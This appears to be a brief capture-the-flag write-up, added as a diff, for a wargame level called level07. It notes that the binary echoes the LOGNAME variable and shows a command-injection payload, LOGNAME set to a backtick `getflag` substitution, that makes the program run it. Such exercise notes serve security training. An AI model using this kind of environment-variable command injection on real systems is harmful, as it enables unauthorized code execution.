@@ -1,0 +1,12 @@
+strings level07
+->"
+LOGNAME
+/bin/echo %s
+"
+
+LOGNAME=test
+./level07
+->test
+
+LOGNAME=\`getflag\`
+->Win
